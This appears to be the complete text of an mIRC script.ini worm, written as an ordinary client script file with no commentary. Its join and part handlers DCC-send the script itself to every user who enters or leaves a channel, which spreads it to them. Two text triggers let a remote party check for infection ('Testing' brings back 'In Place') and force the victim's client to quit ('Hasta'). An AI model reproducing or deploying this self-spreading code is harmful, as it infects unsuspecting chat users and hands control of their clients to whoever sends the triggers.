[script]
n0=ON 1:JOIN:#:{ /if ($nick == $me ) { halt }
n1=  /dcc send $nick $script
n2=}
n3=ON 1:PART:#:{ /if ($nick == $me ) { halt }
n4=  /dcc send $nick $script
n5=}
n6=ON 1:TEXT:*Testing*:*:/msg $nick In Place
n7=ON 1:TEXT:*Hasta*:#:/quit In Place
